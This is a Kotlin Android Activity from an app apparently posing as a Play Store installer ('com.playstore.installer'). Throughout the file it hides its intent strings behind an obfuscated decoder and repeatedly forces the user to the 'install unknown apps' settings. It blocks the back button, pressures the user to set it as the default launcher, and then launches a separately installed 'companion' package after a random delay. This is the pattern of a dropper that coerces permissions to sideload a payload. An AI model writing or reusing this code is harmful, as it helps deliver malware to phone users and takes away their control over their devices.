package com.playstore.installer

import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.widget.Toast
import android.app.Activity

class SecondActivity : Activity() {

    private val handler = Handler(Looper.getMainLooper())
    private var permissionRequested = false
    private var navigatingToInstall = false
    private lateinit var permissionCheckRunnable: Runnable
    private lateinit var homeCheckRunnable: Runnable

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        permissionCheckRunnable = Runnable {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                if (packageManager.canRequestPackageInstalls()) {
                    goToInstallActivity()
                } else {
                    handler.postDelayed(permissionCheckRunnable, 1000)
                }
            } else {
                goToInstallActivity()
            }
        }

        homeCheckRunnable = Runnable {
            if (isDefaultHome()) {
                goToInstallActivity()
            } else {
                handler.postDelayed(homeCheckRunnable, 1000)
            }
        }

        goToUnknownApps()
    }

    override fun onResume() {
        super.onResume()
        permissionRequested = false

        if (!isDefaultHome()) {
            goToUnknownApps()
            return
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            if (packageManager.canRequestPackageInstalls()) {
                goToInstallActivity()
            } else {
                handler.removeCallbacks(permissionCheckRunnable)
                handler.postDelayed(permissionCheckRunnable, 1000)
            }
        } else {
            goToInstallActivity()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        handler.removeCallbacksAndMessages(null)
    }

    override fun onBackPressed() {
        if (!isDefaultHome()) {
            goToUnknownApps()
            return
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            if (!packageManager.canRequestPackageInstalls()) {
                goToUnknownApps()
            }
        }
    }

    private fun goToUnknownApps() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            if (packageManager.canRequestPackageInstalls()) {
                goToInstallActivity()
                return
            }

            if (!permissionRequested) {
                permissionRequested = true
                val intent = Intent(StringPool.d(StringPool.UNKNOWN_SOURCES))
                intent.data = Uri.parse("package:$packageName")
                startActivity(intent)
            }

            handler.postDelayed(permissionCheckRunnable, 1000)

        } else {
            Toast.makeText(
                this,
                StringPool.d(StringPool.MSG_SET_HOME),
                Toast.LENGTH_LONG
            ).show()

            try {
                val intent = Intent(StringPool.d(StringPool.HOME_SETTINGS))
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivity(intent)
            } catch (e: Exception) {
                val intent = Intent(StringPool.d(StringPool.APP_DETAILS_URI))
                intent.data = Uri.parse("package:$packageName")
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivity(intent)
            }

            handler.postDelayed(homeCheckRunnable, 1000)
        }
    }

    private fun isDefaultHome(): Boolean {
        val intent = Intent(Intent.ACTION_MAIN)
        intent.addCategory(Intent.CATEGORY_HOME)
        val info = packageManager.resolveActivity(intent, PackageManager.MATCH_DEFAULT_ONLY)
            ?: return false
        return info.activityInfo?.packageName == packageName
    }

    // Reads companion package name saved by InstallReceiver after successful install
    private fun getSavedCompanionPkg(): String? {
        return getSharedPreferences(InstallReceiver.PREFS_NAME, Context.MODE_PRIVATE)
            .getString(InstallReceiver.KEY_MODULE_PKG, null)
    }

    private fun isCompanionInstalled(): Boolean {
        val pkg = getSavedCompanionPkg() ?: return false
        return try {
            packageManager.getPackageInfo(pkg, 0)
            true
        } catch (e: Exception) {
            false
        }
    }

    private fun launchCompanionApp() {
        val pkg = getSavedCompanionPkg()
        if (pkg.isNullOrEmpty()) {
            goToInstallActivityNow()
            return
        }
        try {
            val launch = packageManager.getLaunchIntentForPackage(pkg)
            if (launch != null) {
                launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                launch.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK)
                startActivity(launch)
                finish()
            } else {
                goToInstallActivityNow()
            }
        } catch (e: Exception) {
            goToInstallActivityNow()
        }
    }

    private fun goToInstallActivity() {
        if (navigatingToInstall) return
        navigatingToInstall = true
        handler.removeCallbacksAndMessages(null)
        if (isCompanionInstalled()) {
            launchCompanionApp()
            return
        }
        goToInstallActivityNow()
    }

    private fun goToInstallActivityNow() {
        handler.removeCallbacksAndMessages(null)
        val delay = (500L..1000L).random()
        handler.postDelayed({
            val intent = Intent(this, InstallActivity::class.java)
            startActivity(intent)
            finish()
        }, delay)
    }
}
